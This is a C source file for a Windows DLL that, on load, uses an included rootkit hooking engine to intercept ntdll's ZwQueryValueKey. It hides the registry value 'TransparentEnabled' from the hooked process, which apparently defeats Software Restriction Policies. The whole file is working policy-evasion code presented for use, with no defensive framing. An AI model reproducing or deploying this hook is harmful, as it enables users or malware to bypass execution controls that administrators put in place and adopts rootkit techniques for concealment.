// Kodmaker@syshell.org
// Original idea by Mark Russinovitch (http://www.sysinternals.com/)

#include <windows.h>
#include <wchar.h>
#include <string.h>
#include <tchar.h>
#include <stdio.h>

#include "Engine/Hijacking/kDisAsm/kEPhook.h"		// NtIllusion Rootkit hijack engine


typedef DWORD NTSTATUS;
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef enum _KEY_VALUE_INFORMATION_CLASS {
  KeyValueBasicInformation,
  KeyValueFullInformation,
  KeyValuePartialInformation
} KEY_VALUE_INFORMATION_CLASS;
#define STATUS_OBJECT_NAME_NOT_FOUND     0xC0000034


FARPROC fZwQueryValueKey;


NTSTATUS WINAPI MyZwQueryValueKey(
    IN HANDLE  KeyHandle,
    IN PUNICODE_STRING  ValueName,
    IN KEY_VALUE_INFORMATION_CLASS  KeyValueInformationClass,
    OUT PVOID  KeyValueInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    )
{

	char val[1024];
	char str_msg[1024+64];


	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)
	  ValueName->Buffer, -1, val, 255,NULL, NULL);

	sprintf(str_msg, "MyZwQueryValueKey('%s')\n", val);
	OutputDebugString(str_msg);


	if(ValueName->Length && ValueName->Buffer[ValueName->Length / sizeof(WCHAR)]==0)
	{
		if(
			!_tcsicmp((const char *)ValueName->Buffer, _T("TransparentEnabled"))
			||
			!strcmp(val, "TransparentEnabled")
			)
		{
			OutputDebugString("Blocking ZwQueryValueKey('TransparentEnabled')!\n");
			return STATUS_OBJECT_NAME_NOT_FOUND;
		}
	}

	return (NTSTATUS)fZwQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass,
		KeyValueInformation, Length, ResultLength);
}


BOOL WINAPI DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		if(HookApi("ntdll.dll", "ZwQueryValueKey", (DWORD)&MyZwQueryValueKey, 
				&fZwQueryValueKey))
			OutputDebugString("ZwQueryValueKey hook: OK.\n");
		else
			OutputDebugString("ZwQueryValueKey hook: FAILED.\n");

		WakeUpProcess(0);
	}


    return TRUE;
}

